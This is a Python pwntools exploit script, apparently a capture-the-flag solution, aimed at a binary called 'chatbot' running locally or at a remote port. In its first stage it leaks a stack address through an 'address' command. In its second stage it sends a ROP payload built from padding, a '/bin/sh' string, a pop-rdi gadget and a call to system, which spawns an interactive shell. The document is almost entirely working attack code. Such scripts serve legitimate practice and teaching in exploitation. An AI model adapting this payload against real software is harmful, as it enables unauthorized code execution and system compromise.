#!/usr/bin/python3

from pwn import *

exe = ELF('chatbot', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*readline+37
        
        c
        nextret
        c

        ''')
        input()


if args.REMOTE:
    p = remote('0', 9991)
else:
    p = process(exe.path)
GDB()

###################################
### Stage 1: Leak stack address ###
###################################
sla(b'Command: ', b'address')
p.recvuntil(b'Reply: ')
stack_leak = int(p.recvline(), 16)
saved_rip = stack_leak - 0x8
info("Stack leak: " + hex(stack_leak))

##########################
### Stage 2: Get shell ###
##########################
pop_rdi = 0x0000000000401473
call_system = 0x000000000040134e
payload = flat(
    b'A'*0x18,                  # Saved rip right above our buffer so we will pad 0x18 byte and then our string /bin/sh
    b'/bin/sh\0',
    b'A'*0xb8,
    p8(p64(saved_rip + 40 - 1)[0]),
    pop_rdi,
    stack_leak + 0x18,          # Point to string /bin/sh
    # exe.plt.system,           # This will cause segfault due to xmm
    call_system                 # Call instruction will push address to stack so stack is aligned now
    )
sla(b'Command: ', payload)

p.interactive()
